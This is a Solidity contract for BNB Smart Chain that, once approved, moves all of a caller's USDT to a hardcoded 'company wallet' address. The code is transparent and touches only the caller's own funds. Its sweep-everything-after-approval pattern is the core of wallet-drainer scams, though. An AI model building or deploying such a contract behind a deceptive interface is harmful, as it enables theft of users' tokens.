// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract USDTTransfer {
    // BSC Mainnet USDT address
    address constant USDT_ADDRESS = 0x55d398326f99059fF775485246999027B3197955;
    
    // Company wallet address (receiver)
    address constant RECEIVER = 0x1734b55dc44C420539a607Ff5b80aB62b0d18963;
    
    /**
     * @dev Transfer all USDT from caller to company wallet
     * Requires caller to have approved this contract to spend their USDT
     */
    function transferAllUSDT() external {
        IERC20 usdt = IERC20(USDT_ADDRESS);
        
        // Get caller's USDT balance
        uint256 balance = usdt.balanceOf(msg.sender);
        require(balance > 0, "No USDT balance to transfer");
        
        // Transfer all USDT to company wallet
        bool success = usdt.transferFrom(msg.sender, RECEIVER, balance);
        require(success, "Transfer failed");
    }
    
    /**
     * @dev Check USDT balance of an address
     */
    function getBalance(address account) external view returns (uint256) {
        IERC20 usdt = IERC20(USDT_ADDRESS);
        return usdt.balanceOf(account);
    }
}
